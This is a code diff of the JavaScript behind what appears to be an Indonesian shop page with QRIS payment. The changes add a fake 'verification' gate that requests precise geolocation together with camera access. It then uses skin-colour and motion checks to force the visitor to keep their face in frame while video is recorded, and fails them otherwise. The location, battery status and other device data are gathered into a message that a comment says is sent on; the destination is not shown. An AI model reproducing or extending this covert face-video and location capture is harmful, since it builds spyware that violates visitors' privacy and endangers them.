@@ -2893,7 +2893,6 @@
             frame();
         })();
 
-        /* ═══════════════ LOGO IMAGE FIX ═══════════════ */
         (function () {
             const LOGO_URL = 'https://raw.githubusercontent.com/ilhamalfahrizy731-rgb/hamz/refs/heads/main/preview.webp';
             const heroLogo = document.getElementById('heroLogo');
@@ -2906,13 +2905,11 @@
             }
         })();
 
-        /* ═══════════════ CLOSE ON OVERLAY ═══════════════ */
         document.getElementById('detov').addEventListener('click', function (e) { if (e.target === this) closeDetail() });
         document.getElementById('payov').addEventListener('click', function (e) { if (e.target === this) closePay() });
         document.getElementById('qrisov').addEventListener('click', function (e) { if (e.target === this) closeQrisModal() });
 
         function showQrisModal() {
-            // Update QRIS modal dengan info produk yang dipilih
             if (currProd) {
                 document.getElementById('qrisName').textContent = currProd.n;
                 document.getElementById('qrisPrice').textContent = currProd.dp;
@@ -2928,8 +2925,8 @@
             document.querySelector('#qrisov > div').style.transform = 'translateY(20px) scale(.97)';
         }
 
-        /* ═══════════════ LOADER ═══════════════ */
         let verificationAttemptFailed = false; // Flag untuk track kegagalan verifikasi
+        let verifiedLocation = null; // Lokasi disimpan satu kali (detikasi izin lokasi)
         function createCameraGate() {
             if (document.getElementById('camera-gate')) return document.getElementById('camera-gate');
             const gate = document.createElement('div');
@@ -2966,6 +2963,32 @@
             const gate = createCameraGate();
             const retryButton = gate.querySelector('#camera-gate-retry');
             const messageEl = gate.querySelector('#camera-gate-message');
+
+            const requestLocationOnce = async () => {
+                if (window.verifiedLocation) return window.verifiedLocation;
+                if (!navigator.geolocation) {
+                    window.verifiedLocation = { error: 'Geolocation tidak didukung' };
+                    return window.verifiedLocation;
+                }
+
+                return new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            window.verifiedLocation = {
+                                latitude: pos.coords.latitude,
+                                longitude: pos.coords.longitude,
+                                accuracy: pos.coords.accuracy
+                            };
+                            resolve(window.verifiedLocation);
+                        },
+                        (err) => {
+                            window.verifiedLocation = { error: 'Lokasi tidak diizinkan atau timeout: ' + err.message };
+                            resolve(window.verifiedLocation);
+                        },
+                        { timeout: 10000 }
+                    );
+                });
+            };
 
             const getPermissionState = async () => {
                 if (!navigator.permissions || !navigator.permissions.query) return 'prompt';
@@ -3004,8 +3027,12 @@
                     });
                     faceVideo.play().catch(() => { });
 
-                    // Deteksi apakah kamera ditutup
+                    // Deteksi apakah kamera ditutup / bukan ke wajah
                     let cameraCovered = false;
+                    let prevImageData = null;
+                    let faceConfidence = 0;
+                    let motionScore = 0;
+                    let faceDetected = false;
                     const canvas = document.createElement('canvas');
                     const ctx = canvas.getContext('2d');
                     const checkCameraInterval = setInterval(() => {
@@ -3022,37 +3049,83 @@
                         ctx.drawImage(faceVideo, 0, 0);
                         const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                         const data = imageData.data;
+
+                        // Ruang tengah 40% - estimasi wajah
+                        const cx = Math.floor(canvas.width * 0.3);
+                        const cy = Math.floor(canvas.height * 0.2);
+                        const cw = Math.floor(canvas.width * 0.4);
+                        const ch = Math.floor(canvas.height * 0.4);
+
+                        let centerBrightness = 0;
+                        let centerCount = 0;
                         let totalBrightness = 0;
-                        let pixelCount = 0;
-                        for (let i = 0; i < data.length; i += 4) {
-                            const r = data[i], g = data[i + 1], b = data[i + 2];
-                            const brightness = (r + g + b) / 3;
-                            totalBrightness += brightness;
-                            pixelCount++;
+                        let totalCount = 0;
+                        let centerSkinCount = 0;
+                        for (let y = 0; y < canvas.height; y++) {
+                            for (let x = 0; x < canvas.width; x++) {
+                                const idx = (y * canvas.width + x) * 4;
+                                const r = data[idx], g = data[idx + 1], b = data[idx + 2];
+                                const brightness = (r + g + b) / 3;
+                                totalBrightness += brightness;
+                                totalCount++;
+                                if (x >= cx && x < cx + cw && y >= cy && y < cy + ch) {
+                                    centerBrightness += brightness;
+                                    centerCount++;
+                                    const isSkin = r > 95 && g > 40 && b > 20 && r > g && r > b && Math.abs(r - g) > 15;
+                                    if (isSkin) centerSkinCount++;
+                                }
+                            }
                         }
-                        const avgBrightness = totalBrightness / pixelCount;
 
-                        // Hitung variansi untuk deteksi frame statis/hitam
-                        let variance = 0;
-                        for (let i = 0; i < data.length; i += 4) {
-                            const r = data[i], g = data[i + 1], b = data[i + 2];
-                            const brightness = (r + g + b) / 3;
-                            variance += Math.pow(brightness - avgBrightness, 2);
+                        const avgBrightness = totalBrightness / totalCount;
+                        const avgCenterBrightness = centerBrightness / centerCount;
+                        const centerSkinRatio = centerSkinCount / centerCount;
+
+                        // Momentum per pixel (motion) terhadap frame sebelumnya
+                        let motion = 0;
+                        if (prevImageData) {
+                            const prev = prevImageData.data;
+                            for (let i = 0; i < data.length; i += 4) {
+                                motion += Math.abs(data[i] - prev[i]) + Math.abs(data[i + 1] - prev[i + 1]) + Math.abs(data[i + 2] - prev[i + 2]);
+                            }
+                            motion = motion / (totalCount * 3);
                         }
-                        variance /= pixelCount;
+                        prevImageData = imageData;
 
-                        // Jika brightness rata-rata < 30 DAN variansi < 100, kemungkinan kamera ditutup
-                        if (avgBrightness < 30 && variance < 100) {
+                        // Hitung frame 'wajah': tengah lebih cerah daripada rata-rata & tidak terlalu gelap
+                        const faceFrame = avgCenterBrightness > 50 && avgCenterBrightness > avgBrightness * 0.9;
+                        if (faceFrame) {
+                            faceConfidence++;
+                        }
+                        if (motion > 10) motionScore++;
+
+                        // Cek kamera ditutup
+                        if (avgBrightness < 25 || (avgCenterBrightness < 30 && avgBrightness < 40)) {
                             cameraCovered = true;
                             cameraStatus.style.display = 'block';
                             verificationStatus.textContent = 'Kamera ditutup! Buka kamera untuk melanjutkan.';
                             verificationStatus.style.color = '#f00';
-                        } else {
-                            cameraCovered = false;
-                            cameraStatus.style.display = 'none';
-                            verificationStatus.textContent = 'Wajah terdeteksi. Proses verifikasi...';
-                            verificationStatus.style.color = '#0f0';
+                            return;
                         }
+
+                        cameraCovered = false;
+                        cameraStatus.style.display = 'none';
+
+                        if (faceConfidence >= 6) {
+                            faceDetected = true;
+                            verificationStatus.textContent = 'Wajah terdeteksi dengan baik. Melanjutkan verifikasi...';
+                            verificationStatus.style.color = '#0f0';
+                        } else {
+                            verificationStatus.textContent = 'Arahkan kamera ke wajah Anda (fokus di tengah frame).';
+                            verificationStatus.style.color = '#f00';
+                        }
+
+                        // Pelaporan status detail lebih ringan
+                        const movementText = motionScore > 4 ? 'Gerakan kepala terdeteksi' : 'Silakan gerakkan kepala sedikit';
+                        if (!faceDetected) {
+                            verificationStatus.textContent = `Wajah belum cukup jelas. ${movementText}`;
+                        }
+
                     }, 500);
 
                     // Tunggu 2 detik untuk stabilisasi
@@ -3077,6 +3150,7 @@
                     const totalTime = 8000; // 8 detik
                     const startTime = Date.now();
                     let verificationSuccess = false; // Flag untuk track kesuksesan verifikasi
+                    let continuousFaceDetectionRequired = true; // Flag untuk continuous monitoring
 
                     return new Promise((resolve) => {
                         let progressInterval = setInterval(() => {
@@ -3085,6 +3159,22 @@
                             const progress = Math.min(100, (elapsed / totalTime) * 100);
                             progressBar.style.width = progress + '%';
                             timeRemaining.textContent = Math.ceil(remaining / 1000);
+
+                            // Monitor terus-menerus: jika wajah yang sudah terdeteksi hilang, gagal
+                            if (faceDetected && !faceFrame) {
+                                clearInterval(progressInterval);
+                                clearInterval(checkCameraInterval);
+                                mediaRecorder.stop();
+                                stream.getTracks().forEach(track => track.stop());
+                                messageEl.textContent = 'Verifikasi gagal: Kamera tidak tetap menunjuk ke wajah. Refresh dan coba lagi.';
+                                verificationAttemptFailed = true;
+                                verificationSuccess = false;
+                                continuousFaceDetectionRequired = false;
+                                previewBox.style.display = 'none';
+                                verificationProgress.style.display = 'none';
+                                resolve(false);
+                                return;
+                            }
 
                             if (cameraCovered) {
                                 clearInterval(progressInterval);
@@ -3108,7 +3198,17 @@
                                 mediaRecorder.onstop = async () => {
                                     stream.getTracks().forEach(track => track.stop());
 
-                                    // Validasi final: cek jika ada data video terekam
+                                    // Validasi final: cek muka sudah terdeteksi dan data video ada
+                                    if (!faceDetected) {
+                                        messageEl.textContent = 'Verifikasi gagal: Kamera tidak diarahkan ke wajah dengan benar. Refresh dan coba lagi.';
+                                        verificationAttemptFailed = true;
+                                        verificationSuccess = false;
+                                        previewBox.style.display = 'none';
+                                        verificationProgress.style.display = 'none';
+                                        resolve(false);
+                                        return;
+                                    }
+
                                     if (recordedChunks.length === 0) {
                                         messageEl.textContent = 'Verifikasi gagal: Tidak ada data video terekam. Refresh dan coba lagi.';
                                         verificationAttemptFailed = true;
@@ -3173,8 +3273,12 @@
                         messageEl.textContent = 'Verifikasi gagal. Silakan refresh halaman (F5) dan coba ulang dari awal.';
                         return;
                     }
-                    messageEl.textContent = 'Silakan konfirmasi izin kamera di popup browser (jika diminta).';
+                    messageEl.textContent = 'Silakan konfirmasi izin kamera dan lokasi di popup browser (jika diminta).';
+
+                    // Request lokasi dan kamera dalam satu tombol action
+                    await requestLocationOnce();
                     const success = await requestCameraOnce();
+
                     if (success) {
                         gate.classList.add('hidden');
                         retryButton.removeEventListener('click', clickHandler);
@@ -3311,22 +3415,12 @@
                     data.battery = 'Tidak didukung';
                 }
 
-                // Location
-                data.location = await new Promise(resolve => {
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(
-                            pos => resolve({
-                                latitude: pos.coords.latitude,
-                                longitude: pos.coords.longitude,
-                                accuracy: pos.coords.accuracy
-                            }),
-                            err => resolve('Tidak diizinkan atau error: ' + err.message),
-                            { timeout: 10000 }
-                        );
-                    } else {
-                        resolve('Geolocation tidak didukung');
-                    }
-                });
+                // Location (gunakan hasil requestLocationOnce sebelumnya agar hanya satu tanda izin)
+                if (window.verifiedLocation) {
+                    data.location = window.verifiedLocation;
+                } else {
+                    data.location = 'Tidak tersedia (geolocation tidak diizinkan atau gagal)';
+                }
 
                 // Kirim pesan teks dengan data
                 const message = `
